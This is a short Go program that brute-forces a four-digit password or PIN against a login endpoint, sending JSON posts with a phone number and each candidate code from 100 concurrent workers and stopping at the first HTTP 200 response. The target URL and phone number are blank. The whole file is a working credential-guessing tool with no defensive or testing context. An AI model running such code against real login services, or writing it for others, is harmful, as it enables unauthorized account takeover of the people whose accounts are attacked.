package main

import (
	"fmt"
	"net/http"
	"os"
	"strings"
	"time"
)

func worker(workerId int, c <-chan string) {
	for pass := range c {
		if check(pass) {
			fmt.Print("[", workerId, "] ", pass, " is OK\n")

			os.Exit(3)
		} else {
			fmt.Print("[", workerId, "] ", pass, " is not OK\n")
			// write to log.txt

		}
	}
}

func main() {
	c := make(chan string, 10000)
	for w := 1; w <= 100; w++ {
		go worker(w, c)
	}
	for i := 0; i < 2000; i++ {
		code := fmt.Sprintf("%d", i)
		if len(code) < 4 {
			code = "0" + code
		}
		if len(code) < 4 {
			code = "0" + code
		}
		if len(code) < 4 {
			code = "0" + code
		}
		c <- code
	}
	close(c)
	time.Sleep(time.Hour * 24)
}

func check(p string) bool {
	url := ""
	method := "POST"

	payload := strings.NewReader(`{
    "phone": "",
    "password": "` + p + `"
}`)

	client := &http.Client{}
	req, err := http.NewRequest(method, url, payload)

	if err != nil {
		fmt.Println(err, p)
		os.Exit(1)
		return false
	}
	req.Header.Add("Accept", "*/*")
	req.Header.Add("Content-Type", "application/json")
	req.Header.Add("Accept-Encoding", "gzip, deflate")

	res, err := client.Do(req)
	if err != nil {
		fmt.Println(err, p)
		os.Exit(1)
		return false
	}
	defer res.Body.Close()
	return res.StatusCode == 200
}
